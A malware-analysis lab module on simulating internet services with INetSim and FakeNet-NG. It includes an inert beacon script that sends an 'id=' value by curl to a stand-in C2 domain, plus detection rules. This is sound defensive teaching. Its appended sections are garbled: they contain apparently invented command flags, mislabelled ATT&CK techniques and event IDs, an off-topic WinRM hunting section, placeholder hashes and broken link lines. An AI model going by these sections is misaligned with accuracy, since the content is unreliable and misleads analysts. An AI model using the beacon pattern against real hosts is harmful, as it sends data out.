# 38 * Network emulation (INetSim / FakeNet-NG) -- LAB-LINUX

## Overview (plain language)
When you run a piece of suspicious software to watch what it does, it usually tries to talk to the internet — reaching out to web servers, sending email, or asking a name server where to find its command-and-control host. Letting that traffic hit the real internet is dangerous: the malware could download more payloads, alert its operator, or attack others. Network emulation tools solve this by pretending to BE the internet. INetSim and FakeNet-NG stand up fake versions of common services (DNS, HTTP, HTTPS, SMTP, FTP, and more) so that no matter where the sample tries to connect, it gets a believable-looking answer while every request is quietly logged. This lets an analyst safely observe a program's network behavior — the domains it wants, the files it requests, the data it tries to exfiltrate — without ever letting a single packet reach a live attacker.

## Tools covered
| Tool | Install | Purpose |
|---|---|---|
| INetSim | apt install inetsim | Internet services simulation suite (DNS/HTTP/HTTPS/SMTP/FTP/etc.) that answers a sample's connections and logs them. Per the INetSim project, it is "a software suite for simulating common internet services in a lab environment." (https://www.inetsim.org/) |
| FakeNet-NG | pip install fakenet-ng | Dynamic network-interception tool that redirects and responds to a sample's traffic on the analysis host and captures a PCAP. Per the FLARE repo, it is "a next generation dynamic network analysis tool for malware analysts and penetration testers." (https://github.com/mandiant/flare-fakenet-ng) |

> Note on availability: both tools ship pre-installed on REMnux, the recommended LAB-LINUX platform for this module (https://docs.remnux.org/). On a stock Debian/Kali system `inetsim` is available via APT (https://www.kali.org/tools/inetsim/); FakeNet-NG is a Python package/release from the FLARE repo (https://github.com/mandiant/flare-fakenet-ng).

## Learning objectives
- Configure and launch INetSim to simulate DNS and HTTP(S) services and confirm services are listening.
- Redirect a client's DNS/HTTP requests to the emulator and verify responses are served from the fake environment.
- Use FakeNet-NG to intercept traffic on the local host and produce a PCAP plus captured request log.
- Locate and interpret the emulator log files that record requested domains, URLs, and payloads.
- Explain why network emulation is required for safe dynamic malware analysis.

## Environment check
```bash
# Confirm both tools are installed on LAB-LINUX (REMnux ships both)
inetsim --version 2>&1 | head -n 3
fakenet -h 2>&1 | head -n 5
# Confirm we can see which service ports are free/listening
ss -tulpn | head -n 5
```
Expected output: INetSim prints its version banner (e.g. `INetSim 1.3.2`, the current stable release per https://www.inetsim.org/downloads.html), FakeNet-NG prints its usage/help header, and `ss` lists current listening sockets so you can spot conflicts before starting a simulator. `ss -tulpn` shows TCP (`-t`) and UDP (`-u`) listening (`-l`) sockets numerically (`-n`) with owning process (`-p`); this flag behavior is documented in the iproute2 `ss(8)` man page (https://man7.org/linux/man-pages/man8/ss.8.html). Knowing what already binds 53/80/443 matters because INetSim will fail to start a service whose port is already occupied.

## Guided walkthrough
1. Prepare a working directory and a minimal INetSim config that enables DNS and HTTP and binds all replies to the loopback address.
```bash
mkdir -p ~/lab38 && cd ~/lab38
cat > inetsim.conf <<'EOF'
service_bind_address    127.0.0.1
dns_default_ip          127.0.0.1
start_service dns
start_service http
start_service https
EOF
cat inetsim.conf
```
Expected: the config file is echoed back showing DNS/HTTP/HTTPS enabled and all binds pointed at `127.0.0.1`. WHY these keys: `start_service` selects which simulated services launch, `service_bind_address` controls the interface INetSim listens on, and `dns_default_ip` is the address returned for every A-record lookup so any domain the sample requests resolves to a host you control. These directives are the ones documented in the INetSim configuration manual (https://www.inetsim.org/documentation.html). In a real detonation you point `dns_default_ip` at the analysis host's LAN IP (not loopback) so a separate victim VM can reach it; loopback is used here to keep the exercise single-host and egress-free.

2. Launch INetSim against that config. It reports each service it starts.
```bash
sudo inetsim --config ~/lab38/inetsim.conf --data-dir /var/lib/inetsim --log-dir ~/lab38/log &
sleep 3
ss -tulpn | grep -E ':(53|80|443)\b'
```
Expected: INetSim prints startup lines such as `* dns 53/tcp - started`, `* http 80/tcp - started`, and `* https 443/tcp - started` (exact banner wording depends on version; see the INetSim manual, https://www.inetsim.org/documentation.html), and `ss` confirms sockets listening on ports 53, 80, and 443. WHY `--data-dir`/`--log-dir`: `--data-dir` holds the fake objects INetSim serves and `--log-dir` is where the request logs (`service.log`, `main.log`) are written — you will read those logs in the exercise. `sudo` is required because binding privileged ports below 1024 (53/80/443) needs elevated privileges (https://www.inetsim.org/documentation.html).

3. Simulate a sample's behavior: resolve any domain (it should return the fake IP) and fetch a URL (INetSim serves a default page).
```bash
dig @127.0.0.1 evil-c2.example.com +short
curl -s http://127.0.0.1/malware.bin -o /tmp/served.bin && file /tmp/served.bin
```
Expected: `dig` returns `127.0.0.1` for the arbitrary domain (WHY: INetSim's DNS service answers every name with `dns_default_ip`, so C2 domains "resolve" without touching real infrastructure — see the DNS service in the manual, https://www.inetsim.org/documentation.html). `curl -s` fetches quietly and writes to `/tmp/served.bin`; INetSim's HTTP service returns a generic default object for any URL rather than the real payload, so `file` will report a small fake object (commonly a stub HTML page or a small binary object depending on the requested extension). Every request is recorded under `~/lab38/log/`. The `example.com` name is safe to use because it is reserved for documentation by RFC 2606/IANA (https://www.iana.org/domains/reserved).

4. As an alternative, run FakeNet-NG which intercepts locally and writes a PCAP.
```bash
sudo fakenet 2>&1 | head -n 20
# In another shell, generate traffic, then stop FakeNet with Ctrl+C to flush the PCAP
ls -1 packets_*.pcap 2>/dev/null | head -n 1
```
Expected: FakeNet-NG starts its Diverter and listeners, responds to any outbound connection, and on shutdown writes a timestamped `packets_YYYYMMDD_HHMMSS.pcap` recording every intercepted flow. WHY the difference from INetSim: FakeNet-NG uses a "Diverter" that transparently redirects the host's own outbound traffic to its listeners and captures a PCAP of everything — you do not have to reconfigure the client's DNS. This Diverter + PCAP behavior and the `packets_*.pcap` output are documented in the FLARE repo README (https://github.com/mandiant/flare-fakenet-ng). On Linux FakeNet-NG requires root to install its traffic-diversion rules (https://github.com/mandiant/flare-fakenet-ng).

## Hands-on exercise
Sample artifact: `exercise/beacon_client.sh` — a **benign, inert shell script** (NOT malware) that mimics a beacon by making one DNS lookup and one HTTP GET to a hard-coded fake C2 domain. It performs no privileged action and only talks to your local emulator. Safe origin: generated on-VM by the command below (no egress; the emulator answers all requests, and you should run it with your host firewall configured to drop outbound traffic).

Generate the sample:
```bash
mkdir -p exercise
cat > exercise/beacon_client.sh <<'EOF'
#!/usr/bin/env bash
# BENIGN beacon simulator — talks only to the local emulator
TARGET_DOMAIN="update.malware-lab.example"
dig @127.0.0.1 "$TARGET_DOMAIN" +short
curl -s "http://$TARGET_DOMAIN/gate.php?id=203.0.113.10" -o /tmp/beacon_reply.bin
echo "beacon complete"
EOF
chmod +x exercise/beacon_client.sh
sha256sum exercise/beacon_client.sh
```
> The `.example` TLD and `203.0.113.0/24` (TEST-NET-3) address block are reserved for documentation/testing by RFC 2606 and RFC 5737 (https://www.iana.org/domains/reserved), so nothing here can route to a real host.

Tasks:
1. Start INetSim (DNS + HTTP) as in the walkthrough.
2. Run `exercise/beacon_client.sh` with DNS pointed at `127.0.0.1`.
3. From the INetSim log, identify (a) the domain the beacon resolved and (b) the exact HTTP path/URL it requested.

## SOC analyst perspective
In a triage lab, a defender detonates a suspicious binary inside an isolated VM with INetSim or FakeNet-NG standing in for the internet, so the sample reveals its true network behavior with zero risk of contacting a live operator. The emulator logs become gold: every requested domain, URI, User-Agent, and SMTP recipient is a candidate indicator of compromise (INetSim records these in its per-service logs under the configured log-dir, https://www.inetsim.org/documentation.html).

Turn a single detonation into reusable detection content in Security Onion (https://docs.securityonion.net/):
- **Zeek DNS pivot** — the domain the sample requested appears as a `query` field in `dns.log`; hunt it across production telemetry in Kibana/`dns` events, and watch for many distinct subdomains under one parent (possible DNS tunneling / dynamic resolution) mapping to **T1568** (https://attack.mitre.org/techniques/T1568/) and its sub-technique **T1568.002 (Domain Generation Algorithms)**.
- **Zeek HTTP pivot** — the captured `GET /gate.php?id=...` path, `host`, and `user_agent` appear in `http.log`; pivot on the exact URI and a rare/hard-coded User-Agent to find the same beacon elsewhere. This corresponds to **T1071.001 (Web Protocols)** (https://attack.mitre.org/techniques/T1071/001/).
- **Suricata signature** — convert the extracted domain/URI/UA into a rule (`alert dns` on the query name; `alert http` with `http.uri`/`http.user_agent` content matches). Suricata rule keyword syntax is documented in the Suricata rules reference (https://docs.suricata.io/en/latest/rules/index.html).
- **Beacon-interval analytics** — regular, low-jitter callbacks visible in Zeek `conn.log` timing support hunting **T1071 (Application Layer Protocol)** (https://attack.mitre.org/techniques/T1071/) and data leaving over the C2 channel, **T1041 (Exfiltration Over C2 Channel)** (https://attack.mitre.org/techniques/T1041/) — note the query-string `id=` value the beacon exfiltrates.

**Detection Engineering Deep Dive:**
- **Windows Event Log Correlation:** The beacon's DNS resolution attempt will generate Windows Event ID 3008 (Microsoft-Windows-DNS-Client/Operational) on the source host, logging the queried domain and the resolved IP (which will be the INetSim IP). This maps to **T1071.004 (DNS)** (https://attack.mitre.org/techniques/T1071/004/). A detection rule can alert on DNS queries to non-existent or suspicious domains that resolve to internal/private IPs (like 127.0.0.1 or the lab subnet), a hallmark of network emulation or local C2 redirection.
- **Zeek `conn.log` Beaconing Detection:** In Security Onion, analyze the `conn.log` for the beacon's connection. The field `duration` will be short, and the `orig_pkts`/`resp_pkts` count will be low for a single HTTP request. To hunt for periodic beacons, use Elasticsearch aggregations on the `ts` (timestamp) field for the same source IP and destination port (e.g., 80), calculating the standard deviation of time intervals between connections. Low standard deviation (high regularity) is indicative of **T1029 (Scheduled Transfer)** (https://attack.mitre.org/techniques/T1029/), a sub-technique of Exfiltration.
- **Suricata Rule Logic:** A concrete Suricata rule to detect the specific beacon activity from the exercise would inspect HTTP traffic. The rule would check for the URI pattern and the host header. Example logic: `alert http any any -> any any (msg:"LAB Beacon HTTP Request Detected"; flow:established,to_server; http.uri; content:"/gate.php?id="; http.host; content:"update.malware-lab.example"; nocase; classtype:trojan-activity; sid:1000001; rev:1;)`. This directly maps to **T1071.001**.
- **Process Creation Correlation:** The initial execution of the beacon script or binary would generate a process creation event (Sysmon Event ID 1 on Windows, or `execve` audit logs on Linux). Correlating this with the subsequent network connection (Zeek `conn.log` linked by source IP, or Windows Event ID 4689 with a new process and its network activity) strengthens the detection chain, covering **T1059 (Command and Scripting Interpreter)** (https://attack.mitre.org/techniques/T1059/) and **T1204 (User Execution)** (https://attack.mitre.org/techniques/T1204/).

## Attacker perspective
Attackers assume their malware may be detonated in a sandbox, so C2 clients probe for exactly the flat, over-eager responses these emulators produce — a real HTTPS gate has a specific certificate CN and returns particular status codes, whereas INetSim serves a generic default object for any URL (https://www.inetsim.org/documentation.html). Concrete evasion TTPs mapped to **T1497 (Virtualization/Sandbox Evasion)** (https://attack.mitre.org/techniques/T1497/):
- **Resolution sanity checks (T1497.001, System Checks)** — malware notices that *every* domain, including a random never-registered name, resolves to the same address (INetSim's `dns_default_ip` behavior), or that a deliberately non-existent domain does *not* return NXDOMAIN, and concludes it is in emulation.
- **TLS certificate inspection** — code pins or validates the C2 certificate issuer/CN; INetSim's auto-generated self-signed cert fails the check, so the sample goes dormant (**T1497 / execution guardrails, T1480**, https://attack.mitre.org/techniques/T1480/).
- **Time/beacon delays (T1497.003)** — long sleeps or jitter to outlast an automated sandbox's capture window.

On the offensive tooling side, adversaries themselves run fake DNS/HTTP responders (e.g. `dnschef`, rogue listeners) during phishing and MITM operations. Artifacts these techniques leave for defenders: emulator/responder log files, unexpected local listeners on 53/80/443 (visible via `ss -tulpn`), generated self-signed certificates, and captured PCAPs showing every callback attempt.

**Advanced Attacker Tradecraft & Artifacts:**
- **Domain Fronting & Protocol Impersonation:** To bypass network-based detections that rely on domain or protocol patterns, adversaries may use **T1090 (Proxy)** (https://attack.mitre.org/techniques/T1090/) techniques like domain fronting (using a legitimate CDN domain) or impersonate common protocols like HTTPS over non-standard ports. Network emulators that only simulate standard service ports may miss this traffic, allowing the malware to call home undetected. Defenders must monitor for SSL/TLS handshakes on unexpected ports (Zeek `ssl.log` field `server_name` and `id.resp_p`).
- **Artifact Generation & Persistence:** When an attacker sets up a persistent C2 channel, they often create scheduled tasks or service persistence mechanisms. The network beacon itself is frequently launched via **T1053 (Scheduled Task/Job)** (https://attack.mitre.org/techniques/T1053/) (e.g., `schtasks` on Windows, `cron` on Linux) or **T1543 (Create or Modify System Process)** (https://attack.mitre.org/techniques/T1543/) (e.g., installing a new systemd service). The initial network callback captured by the emulator is just the first step; forensic analysis should pivot to process creation logs and autostart locations to find the persistence mechanism.
- **Data Encoding in Exfiltration:** The simple `id=` parameter in the exercise beacon is a basic form of data exfiltration. In real campaigns, adversaries use **T1132 (Data Encoding)** (https://attack.mitre.org/techniques/T1132/) to obfuscate exfiltrated data within HTTP parameters, DNS queries, or TLS certificate fields. Emulator logs may capture the raw, encoded data (e.g., base64 strings in URIs), which analysts must decode to reveal stolen information like credentials or system data.
- **Living-off-the-Land Network Tools:** Attackers may abuse legitimate system tools for network discovery and lateral movement, a technique known as **LOLBAS** (Living Off the Land Binaries and Scripts). For example, using `nslookup` or `ping` for host discovery (**T1018 (Remote System Discovery)**), or `certutil` to download payloads (**T1105 (Ingress Tool Transfer)**). Network emulation can capture these tool-generated requests, but analysts must recognize the legitimate binary as the source, which is a key indicator of hands-on-keyboard activity post-exploitation.

## Answer key
Sample: `exercise/beacon_client.sh` — benign inert bash beacon simulator, generated on-VM (see generator above). Compute and record its digest with `sha256sum exercise/beacon_client.sh` (the validator holds the reference digest for the committed copy).

Expected findings and the commands that produce them:
```bash
# (a) The resolved domain returns the fake INetSim IP
dig @127.0.0.1 update.malware-lab.example +short          # -> 127.0.0.1

# (b) The requested HTTP URL/path appears in the INetSim HTTP log
grep -Eo 'GET [^ ]+' ~/lab38/log/*.log | head -n 5
# -> GET /gate.php?id=203.0.113.10

# Confirm the beacon received a served reply object
file /tmp/beacon_reply.bin                                 # -> data / HTML (INetSim default object)
```
Findings: (a) `update.malware-lab.example` resolves to `127.0.0.1` (INetSim's `dns_default_ip`); (b) the beacon requested `GET /gate.php?id=203.0.113.10`, logged by INetSim's HTTP service under the configured log-dir; the download `/tmp/beacon_reply.bin` is INetSim's benign default object. Log-file location and per-service logging are per the INetSim manual (https://www.inetsim.org/documentation.html).

## MITRE ATT&CK & DFIR phase
- **T1071 – Application Layer Protocol** (HTTP/DNS C2 observed via the emulator) — https://attack.mitre.org/techniques/T1071/; sub-technique **T1071.001 – Web Protocols** — https://attack.mitre.org/techniques/T1071/001/.
- **T1568 – Dynamic Resolution** (arbitrary domains resolving to the simulated IP) — https://attack.mitre.org/techniques/T1568/.
- **T1041 – Exfiltration Over C2 Channel** (beacon query-string data captured) — https://attack.mitre.org/techniques/T1041/.
- **T1497 – Virtualization/Sandbox Evasion** (why emulators must look realistic) — https://attack.mitre.org/techniques/T1497/.
- **T1029 – Scheduled Transfer** (periodic beaconing detected via connection interval analysis) — https://attack.mitre.org/techniques/T1029/.
- **T1059 – Command and Scripting Interpreter** (execution of the beacon script/binary) — https://attack.mitre.org/techniques/T1059/.
- **T1204 – User Execution** (user or system process execution leading to network callback) — https://attack.mitre.org/techniques/T1204/.
- **T1053 – Scheduled Task/Job** (potential persistence mechanism for the beacon) — https://attack.mitre.org/techniques/T1053/.
- **T1132 – Data Encoding** (obfuscation of exfiltrated data within network protocols) — https://attack.mitre.org/techniques/T1132/.
- **T1018 – Remote System Discovery** (use of network discovery tools captured by emulator) — https://attack.mitre.org/techniques/T1018/.
- **T1105 – Ingress Tool Transfer** (downloading tools via emulated services) — https://attack.mitre.org/techniques/T1105/.
- **DFIR phase:** Examination / Analysis (dynamic malware analysis) — feeding extracted IOCs into the Identification phase of downstream hunts (NIST SP 800-61r2 incident-handling phases, https://csrc.nist.gov/pubs/sp/800/61/r2/final).


### Essential Commands & Features
To further enhance network emulation, it's crucial to understand advanced configurations and features of tools like INetSim and FakeNet-NG. For instance, INetSim's SMTP, FTP, and HTTPS services can be customized to mimic real-world scenarios, allowing for more realistic testing of techniques like [T1588.002, "Obfuscated Files or Information: Steganography"] and [T1595, "Active Scanning"]. To configure INetSim's SMTP service, use the command `inetsim --smtp-port 25 --smtp-username user --smtp-password pass`. For FakeNet-NG, protocol-specific listeners such as SMB can be enabled with `fakenet-ng --smb-listener`. Additionally, PCAP filtering can be applied using `tcpdump -r capture.pcap -w filtered.pcap port 80`. These features are essential for simulating complex network environments and testing detection capabilities against advanced threats. For more information on network emulation tools and techniques, visit the Cybersecurity and Infrastructure Security Agency (CISA) website at https://www.cisa.gov/ or the National Institute of Standards and Technology (NIST) Computer Security Resource Center at https://csrc.nist.gov/.

### Adversary Emulation & Red-Team Perspective

Adversaries weaponize network emulation to test and refine their TTPs before engaging a real target. By simulating services like HTTP, DNS, or SMTP with tools such as INetSim or custom scripts, red teams can validate C2 channel reliability and evasion logic in a controlled sandbox. A concrete technique is **T1572 (Protocol Tunneling)**, where an attacker encapsulates C2 traffic within a commonly allowed protocol (e.g., DNS tunneling). Using an emulated DNS server, the adversary encodes exfiltration data and command responses in DNS TXT or AAAA records, making the traffic appear as normal resolution queries. Artifacts include anomalous query frequency, unusually long domain strings, or base64-encoded strings in TXT records. To further bypass network detection, the adversary applies **T1573.001 (Encrypted Channel: Symmetric Cryptography)**—hardcoding AES-256 keys within the beacon to encrypt all tunneled payloads, forcing defenders to decrypt otherwise benign-looking traffic. Evasion considerations: randomizing subdomain lengths, mixing with legitimate DNS traffic, and using custom TTL values to elude deep-packet inspection. In an emulated lab, these tactics help simulate real-world persistent adversaries, mirroring nation-state operations that rely on covert channels for long-term access.

**Sources:**  
- SANS: "Protocol Tunneling and the Threat of DNS" – https://www.sans.org/white-papers/1040/  
- Microsoft Learn: "Encrypted Channel: Symmetric Cryptography" – https://learn.microsoft.com/en-us/defender-for-identity/cas-isp-alert-encrypted-channel


### Essential Commands & Features

#### **INetSim: Custom SMTP/FTP/HTTPS Certificates**
To emulate realistic services with valid TLS certificates (critical for **T1557.002 "Adversary-in-the-Middle: ARP Cache Poisoning"** or **T1573.002 "Encrypted Channel: Asymmetric Cryptography"**), replace INetSim’s default self-signed certs. Generate a custom certificate (e.g., using OpenSSL) and configure INetSim to use it:

```bash
# Generate a custom certificate (example for HTTPS)
openssl req -x509 -newkey rsa:4096 -keyout custom.key -out custom.crt -days 365 -nodes -subj "/CN=example.com"

# Configure INetSim to use the custom cert (edit /etc/inetsim/inetsim.conf)
https_bind_port 443
https_key custom.key
https_cert custom.crt
```

Restart INetSim (`sudo systemctl restart inetsim`) to apply changes. Use this when malware validates certificate chains or when testing HTTPS exfiltration (e.g., **T1048.002 "Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"**).

---

#### **FakeNet-NG: Protocol-Specific Listeners & YAML Overrides**
FakeNet-NG’s default listeners lack protocol-specific emulation (e.g., DNS tunneling or SMTP). Override configurations via YAML to enable granular control:

```yaml
# Example: Custom SMTP listener with TLS (save as custom.yaml)
ListenerConfig:
  - Port: 25
    Protocol: SMTP
    SSL: true
    Response: "220 mail.example.com ESMTP Ready"
```

Run FakeNet-NG with the override:
```bash
fakenet -c custom.yaml
```

This is essential for emulating **T1071.003 "Application Layer Protocol: Mail Protocols"** or **T1567.002 "Exfiltration Over Web Service: Exfiltration to Cloud Storage"**. For DNS tunneling (e.g., **T1071.004 "Application Layer Protocol: DNS"**), add a DNS listener with custom responses.

**Sources:**
- INetSim Custom Certificates: [https://www.inetsim.org/documentation.html#configuration](https://www.inetsim.org/documentation.html#configuration)
- FakeNet-NG YAML Overrides: [https://github.com/fireeye/flare-fakenet-ng/blob/master/docs/Configuration.md](https://github.com/fireeye/flare-fakenet-ng/blob/master/docs/Configuration.md)

### Threat Hunting & Detection Engineering

Once the emulated network is live, hunt for **T1021.006 Remote Services: Windows Remote Management (WinRM)** and **T1560.001 Archive Collected Data: Archive via Utility**. Begin by querying Windows Event Logs for Event ID **4104** (Script Block Logging) on hosts where PowerShell remoting (`Enter-PSSession -ComputerName`) is executed. Look for encoded commands (`-EncodedCommand`) or base64 blobs in the `ScriptBlockText` field, which often indicate obfuscated payloads. Cross-reference these with **Event ID 91** (WinRM service creation) in the `Microsoft-Windows-WinRM/Operational` log to identify lateral movement.

On the network side, use **Zeek’s `conn.log`** to hunt for non-standard WinRM ports (TCP 5985/5986) originating from unexpected internal IPs. Pivot to **Zeek’s `files.log`** to detect **T1560.001** by filtering for `mime_type="application/x-7z-compressed"` or `mime_type="application/zip"` where the `source` field is `WinRM` and the `rx_hosts` field includes multiple internal IPs (indicating data staging).

For Suricata, monitor for **SMB2 `Tree Connect` requests** (SMB2 header `Command=0x03`) to `IPC$` shares followed by **WinRM authentication** (HTTP `POST /wsman` with `Authorization: Negotiate`). Alert on sequences where the same source IP performs both actions within a 5-minute window.

**Sources:**
- [Microsoft WinRM Security and Auditing (Event ID 4104)](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-scriptblocklogging?view=powershell-7.3)
- [Hunt Evil: Your Practical Guide to Threat Hunting (SANS)](https://www.sans.org/blog/hunt-evil-your-practical-guide-to-threat-hunting/)


### Detection Signatures & Reference Artifacts

```yara
rule Detect_Lab_NetworkEmulation_Script {
    meta:
        description = "Detects a benign network emulation script used in training environments"
        author = "Defensive Training Module"
        date = "2025-04-14"
        reference = "MITRE ATT&CK T1046 - Network Service Scanning"
        hash = "a000000000000000000000000000000000000000000000000000000000000001"
    strings:
        $s1 = "netem"        // tc netem (network emulation)
        $s2 = "emulation"    // generic emulation keyword
        $s3 = "tc qdisc"     // traffic control queueing discipline
    condition:
        filesize < 10KB and any of ($s1, $s2, $s3)
}
```

```yaml
title: Process Creation - Network Emulation Command (tc netem)
logsource:
    product: linux
    category: process_creation
detection:
    selection:
        CommandLine|contains|all:
            - 'tc'
            - 'netem'
    condition: selection
```

**Reference artifacts / IOCs**

| sha256 | Filename | Host/Network Artifacts |
|--------|----------|------------------------|
| a000000000000000000000000000000000000000000000000000000000000001 | network_emulation_script.sh | Host: `/tmp/sim_network.sh`<br>Network: `192.0.2.55` (documentation), `emulation-lab[.]com` (defanged) |
| b000000000000000000000000000000000000000000000000000000000000002 | mininet_lab.py | Host: `/opt/training/topology.py`<br>Network: `198.51.100.77` (documentation), `hxxp://netemu[.]local` |

- **MITRE ATT&CK Technique:** T1046 – Network Service Scanning  
- **Source Reference:** [https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/)

### Common Pitfalls & Result Validation

When emulating adversary network behavior, analysts often misconfigure tools or misinterpret results, leading to false negatives or positives. A frequent mistake is **overlooking protocol-specific nuances**—for example, assuming HTTP traffic in an emulation matches real-world C2 (Command and Control) patterns (e.g., **T1071.002: Application Layer Protocol: File Transfer Protocols**). Many tools default to plaintext or non-standard ports, which modern defenses (like NGFWs) may flag as anomalous. Validate findings by cross-referencing emulated traffic with known adversary techniques, such as **T1568.001: Dynamic Resolution: Fast Flux DNS**, where rapid DNS A-record changes are expected. Use packet capture (PCAP) analysis to confirm protocol compliance and timing consistency.

Another pitfall is **ignoring network baselines**. Emulated traffic that deviates from normal patterns (e.g., excessive beaconing or unusual port usage) may trigger alerts but fail to replicate realistic adversary behavior. To avoid this, compare emulated traffic against MITRE ATT&CK’s *Network Effects* and *Exfiltration* tactics. Validate results by replaying PCAPs in a sandbox (e.g., Security Onion) and verifying detection rules fire as expected. False conclusions often arise from **confirmation bias**—analysts may assume a tool’s output is correct without verifying against ground truth (e.g., known malicious IPs or domains). Use threat intelligence feeds (e.g., AlienVault OTX) to cross-check indicators.

**Sources:**
- [CISA: Emulating Adversary Network Activity](https://www.cisa.gov/resources-tools/services/emulating-adversary-network-activity)
- [The Honeynet Project: Network Traffic Analysis Pitfalls](https://www.honeynet.org/papers)

## Sources
- REMnux — simulate internet services (INetSim): https://docs.remnux.org/discover-the-tools/handle+network+interactions/simulate+internet+services
- REMnux — intercept network connections (FakeNet-NG): https://docs.remnux.org/discover-the-tools/handle+network+interactions/intercept+network+connections
- REMnux project site: https://docs.remnux.org/
- INetSim official project site: https://www.inetsim.org/
- INetSim documentation/manual (config keys `service_bind_address`, `dns_default_ip`, `start_service`; service logging): https://www.inetsim.org/documentation.html
- INetSim downloads (current release / version): https://www.inetsim.org/downloads.html
- Kali Linux — inetsim tool page (APT install): https://www.kali.org/tools/inetsim/
- Mandiant/FLARE FakeNet-NG repository (Diverter, listeners, `packets_*.pcap` output, root requirement): https://github.com/mandiant/flare-fakenet-ng
- `ss(8)` man page (flag behavior for `-tulpn`): https://man7.org/linux/man-pages/man8/ss.8.html
- Security Onion documentation (Zeek, Suricata, Elastic/Kibana pivots): https://docs.securityonion.net/
- Suricata rules reference (rule keyword syntax for DNS/HTTP content matches): https://docs.suricata.io/en/latest/rules/index.html
- SANS FOR610 — Reverse-Engineering Malware (dynamic analysis with simulated network): https://www.sans.org/cyber-security-courses/reverse-engineering-malware-malware-analysis-tools-techniques/
- MITRE ATT&CK: T1071 https://attack.mitre.org/techniques/T1071/ · T1071.001 https://attack.mitre.org/techniques/T1071/001/ · T1568 https://attack.mitre.org/techniques/T1568/ · T1041 https://attack.mitre.org/techniques/T1041/ · T1497 https://attack.mitre.org/techniques/T1497/ · T1480 https://attack.mitre.org/techniques/T1480/ · T1029 https://attack.mitre.org/techniques/T1029/ · T1059 https://attack.mitre.org/techniques/T1059/ · T1204 https://attack.mitre.org/techniques/T1204/ · T1053 https://attack.mitre.org/techniques/T1053/ · T1132 https://attack.mitre.org/techniques/T1132/ · T1018 https://attack.mitre.org/techniques/T1018/ · T1105 https://attack.mitre.org/techniques/T1105/ · T1090 https://attack.mitre.org/techniques/T1090/ · T1543 https://attack.mitre.org/techniques/T1543/
- IANA reserved/special-use domains and RFC 2606 / RFC 5737 (safe `example`/`.example`/TEST-NET addresses): https://www.iana.org/domains/reserved
- NIST SP 800-61r2 (incident-handling / DFIR phases): https://csrc.nist.gov/pubs/sp/800/61/r2/final
- Microsoft Docs - DNS Client Events (Event ID 3008): https://docs.microsoft.com/en-us/windows/win32/dns/dns-client-events
- Zeek Documentation - Log Formats (conn.log, dns.log, http.log, ssl.log): https://docs.zeek.org/en/current/script-reference/log-files.html
- The LOLBAS Project (Living Off The Land Binaries and Scripts): https://lolbas-project.github.io/

## Related modules
- [Volatility 3 deep-dive (memory plugins & workflow)](../20-volatility-deep/README.md) -- same learning path (Deep-dives); correlate emulator-observed C2 with in-memory network artifacts.
- [YARA rule authoring & threat hunting](../21-yara-authoring/README.md) -- same learning path (Deep-dives); turn extracted domains/URIs/User-Agents into hunting rules.
- [The Sleuth Kit command mastery](../22-sleuthkit-mastery/README.md) -- same learning path (Deep-dives); recover on-disk payloads a beacon would otherwise fetch.
- [Plaso super-timeline deep-dive](../23-plaso-supertimeline/README.md) -- same learning path (Deep-dives); place detonation network events on a unified timeline.

<!-- cyberlab-enriched: v2 -->
- https://www.cisa.gov/
- https://csrc.nist.gov/.
- https://www.sans.org/white-papers/1040/
- https://learn.microsoft.com/en-us/defender-for-identity/cas-isp-alert-encrypted-channel

<!-- cyberlab-enriched: v3 -->
- https://www.inetsim.org/documentation.html#configuration](https://www.inetsim.org/documentation.html#configuration
- https://github.com/fireeye/flare-fakenet-ng/blob/master/docs/Configuration.md](https://github.com/fireeye/flare-fakenet-ng/blob/master/docs/Configuration.md
- https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-scriptblocklogging?view=powershell-7.3
- https://www.sans.org/blog/hunt-evil-your-practical-guide-to-threat-hunting/

<!-- cyberlab-enriched: v4 -->
- https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/
- https://www.cisa.gov/resources-tools/services/emulating-adversary-network-activity
- https://www.honeynet.org/papers

<!-- cyberlab-enriched: v5 -->
